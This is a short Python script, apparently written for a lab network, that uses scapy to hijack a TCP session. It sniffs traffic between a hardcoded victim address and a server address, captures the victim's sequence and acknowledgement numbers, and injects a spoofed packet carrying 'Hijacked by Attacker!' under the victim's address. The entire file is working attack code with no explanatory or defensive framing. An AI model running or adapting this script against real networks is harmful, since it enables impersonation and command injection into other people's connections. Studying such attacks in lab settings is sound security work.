from scapy.all import *
from scapy.layers.inet import IP, TCP
from threading import Thread

victim_ip = "192.168.220.133"
server_ip = "192.168.220.132"
victim_port = 54321
server_port = 9998

observed_seq = None
observed_ack = None

def sniff_packets():
    sniff(filter=f"tcp and host {server_ip} and host {victim_ip}", prn=analyze_packet, store=0)

def analyze_packet(packet):
    global observed_seq, observed_ack
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        if packet[IP].src == victim_ip:
            observed_seq = packet[TCP].seq
            observed_ack = packet[TCP].ack
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            print(f"[+] Victim sent: {payload} | SEQ: {observed_seq}, ACK: {observed_ack}")
        elif packet[IP].src == server_ip:
            payload = packet[Raw].load.decode('utf-8', errors='ignore')
            print(f"[+] Server replied: {payload}")

def hijack_session():
    if observed_seq is None or observed_ack is None:
        print("[!] No SEQ/ACK observed yet. Wait for traffic.")
        return
    
    spoofed_payload = "Hijacked by Attacker!"
    spoofed_packet = IP(src=victim_ip, dst=server_ip) / \
                     TCP(sport=victim_port, dport=server_port, 
                         seq=observed_seq, ack=observed_ack, flags="PA") / \
                     Raw(load=spoofed_payload)
    
    send(spoofed_packet, verbose=True)
    print(f"[+] Injected spoofed message: '{spoofed_payload}'")

if __name__ == "__main__":
    Thread(target=sniff_packets).start()
    input("Press Enter to hijack session after capturing SEQ/ACK...")
    hijack_session()
